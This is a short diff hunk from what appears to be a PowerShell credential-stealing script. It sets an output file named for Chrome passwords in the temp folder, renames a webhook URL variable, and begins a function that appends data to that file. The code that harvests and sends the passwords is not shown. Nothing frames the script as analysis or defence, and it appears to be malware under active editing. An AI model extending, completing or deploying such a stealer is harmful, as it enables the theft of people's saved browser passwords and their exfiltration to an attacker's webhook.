@@ -19,7 +19,7 @@ if ((Get-Host).Version.Major -eq 7) {
 }
 
 $outputFilePath = "$env:TEMP\chrome_passwords.txt"  # Output file path
-$webhookUrl = "$dc"
+$hookUrl = "$dc"
 
 # Function to append data to the output file
 function AppendToFile {
